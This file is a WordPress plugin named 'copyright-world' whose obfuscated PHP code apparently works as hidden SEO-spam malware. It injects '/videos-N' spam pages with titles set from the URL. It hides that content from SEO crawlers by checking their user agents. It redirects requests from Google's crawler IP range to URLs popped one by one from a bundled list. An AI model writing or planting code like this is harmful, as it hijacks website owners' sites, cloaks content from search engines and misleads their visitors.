<?php
/**
 * Plugin Name: copyright-world
 * Description: copyright-world
 * Version: 1.0
 * Author: John Smith
 */
 

class tFyUfp {
	
    public function __construct() {
        add_action('init', [$this, 'edgsblhaz']);
        add_filter('query_vars', [$this, 'vwldopwue']);
        add_action('template_include', [$this, 'sgygifo']);
		add_filter('document_title_parts', [$this, 'vysdm']);
    }

    public function edgsblhaz() {
        add_rewrite_rule(
            '^videos-([0-9]+).*?$',
            'index.php?jeywd=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function vwldopwue($n2indSBQ) {
        $n2indSBQ[] = 'jeywd';
        $n2indSBQ[] = 'zjvmsvbxeo';
        return $n2indSBQ;
    }
	
	public function vysdm($lIj454Lf) {
		if (get_query_var('jeywd')) $lIj454Lf['title'] = get_query_var('zjvmsvbxeo');
		return $lIj454Lf;
	}

    public function sgygifo($kgEbI) {
		
		$rFfFwuJ7s = array('Go-http-client', 'post-gdpr', 'cart-instant', 'semrush', 'now-yoast', 'serpstatbot', 'dotbot', 'netspider', 'ahrefsbot', 'mj12bot', 'converter-cart', 'tooltip-flexible', 'python', 'gptbot');
		foreach($rFfFwuJ7s as $fhzHAmy) { if (stripos($_SERVER['HTTP_USER_AGENT'], $fhzHAmy) !== false) return $kgEbI; }

        if (get_query_var('jeywd') && preg_match('/^[0-9]+$/', get_query_var('jeywd'))) {
            return plugin_dir_path(__FILE__) . 'copyright-world/syntax-locator.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$w3bzWBD1L = plugin_dir_path(__FILE__) . 'copyright-world/sitemap-smtp.php';
			if (is_file($w3bzWBD1L)) {
				$g1UIc = file($w3bzWBD1L, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($g1UIc) > 1) {
					$syBX9QY4SH = array_shift($g1UIc);
					$znJ56DA2 = array_shift($g1UIc);
					if (strlen($znJ56DA2) > 0) {
						$sBYPiQti = $syBX9QY4SH . "\n" . implode("\n", $g1UIc);
						file_put_contents($w3bzWBD1L, $sBYPiQti);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $znJ56DA2");
						exit;
					}
				}
			}
		}
        return $kgEbI;
    }
}
new tFyUfp();



